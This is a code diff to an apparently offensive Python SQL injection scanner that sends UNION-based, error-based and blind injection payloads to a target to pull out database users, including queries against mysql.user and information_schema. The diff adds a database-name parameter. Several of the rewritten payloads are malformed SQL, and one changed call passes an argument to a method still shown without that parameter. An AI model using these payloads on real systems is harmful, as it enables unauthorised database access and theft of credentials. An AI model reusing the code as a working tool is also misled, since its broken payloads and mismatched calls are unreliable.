@@ -286,23 +286,24 @@ class SQLInjectionScanner:
             except Exception as e:
                 print(f"Error performing POST request for query '{query}': {e}")
 
-    async def get_current_user(self):
+    async def get_current_user(self, dbname):
         print(f"Getting current user for {self.db_type} database...")
 
         if self.db_type == "MySQL":
-            await self.perform_mysql_get_current_user()
+            await self.perform_mysql_get_current_user(dbname)
         elif self.db_type == "PostGre":
-            await self.perform_postgre_get_current_user()
+            await self.perform_postgre_get_current_user(dbname)
         elif self.db_type == "Microsoft_SQL":
-            await self.perform_microsoftsql_get_current_user()
+            await self.perform_microsoftsql_get_current_user(dbname)
         elif self.db_type == "Oracle":
-            await self.perform_oracle_get_current_user()
+            await self.perform_oracle_get_current_user(dbname)
         elif self.db_type == "Advantage_Database":
-            await self.perform_advantage_get_current_user()
+            await self.perform_advantage_get_current_user(dbname)
         elif self.db_type == "Firebird":
-            await self.perform_firebird_get_current_user()
+            await self.perform_firebird_get_current_user(dbname)
         else:
             print(f"Unsupported database type: {self.db_type}")
+
     async def perform_microsoftsql_get_current_user(self):
         print("Microsoft SQL Server: Retrieving current user...")
         async with aiohttp.ClientSession() as session:
@@ -442,21 +443,21 @@ class SQLInjectionScanner:
                 except Exception as e:
                     print(f"PostgreSQL: Error performing POST request for query '{query}': {e}")
 
-    async def perform_mysql_get_current_user(self):
+    async def perform_mysql_get_current_user(self, dbname):
         print("MySQL: Retrieving current user...")
         async with aiohttp.ClientSession() as session:
             unique_responses = set()
 
             queries = [
-                f"1' OR 1=CONVERT(int, (SELECT {func}())); --" for func in ['user', 'current_user', 'system_user', 'host_name', '@@session.user', '@@user']
+                f"1' OR 1=CONVERT(int, (SELECT {func}() FROM {dbname})); --" for func in ['user', 'current_user', 'system_user', 'host_name', '@@session.user', '@@user']
             ] + [
-                f"1' UNION SELECT null, {func}(), null; --" for func in ['user', 'system_user', 'current_user', 'session_user', '@@user', '@@session.user', 'host_name', 'system_user FROM mysql.user', 'user FROM mysql.user WHERE user NOT LIKE \'root\'', 'user FROM information_schema.tables WHERE table_schema != \'mysql\'']
+                f"1' UNION SELECT null, {func}(), null FROM {dbname}; --" for func in ['user', 'system_user', 'current_user', 'session_user', '@@user', '@@session.user', 'host_name', 'system_user FROM mysql.user', 'user FROM mysql.user WHERE user NOT LIKE \'root\'', 'user FROM information_schema.tables WHERE table_schema != \'mysql\'']
             ] + [
-                f"1' OR IF(1=1, {func}(), 0) --" for func in ['user', 'current_user', 'system_user', '@@session.user']
+                f"1' OR IF(1=1, {func}(), 0) FROM {dbname} --" for func in ['user', 'current_user', 'system_user', '@@session.user']
             ] + [
-                f"1' OR 1=CONVERT(int, (SELECT {func})); --" for func in ['@@version', 'user', 'current_user', 'system_user', 'host_name', '@@session.user']
+                f"1' OR 1=CONVERT(int, (SELECT {func} FROM {dbname})); --" for func in ['@@version', 'user', 'current_user', 'system_user', 'host_name', '@@session.user']
             ] + [
-                f"1' OR SUBSTRING({func}(), 1, 1) = 'a'; --" for func in ['user', 'current_user LIKE \'a%\'']
+                f"1' OR SUBSTRING({func}(), 1, 1) = 'a' FROM {dbname}; --" for func in ['user', 'current_user LIKE \'a%\'']
             ]
 
             for query in queries:
@@ -474,7 +475,7 @@ class SQLInjectionScanner:
                             print(f"MySQL: Retrieving current user response for query '{query}': {current_user}")
                 except Exception as e:
                     print(f"MySQL: Error performing POST request for query '{query}': {e}")
-                    
+
 async def get_dbname(self, db_type):
     print(f"Getting database name for {db_type} database...")
 
@@ -531,7 +532,7 @@ async def main():
         await scanner.get_version()
 
     if args.get_current_user:
-        await scanner.get_current_user()
+        await scanner.get_current_user(scanner.db_name)
 
     await scanner.run_scanner()
 
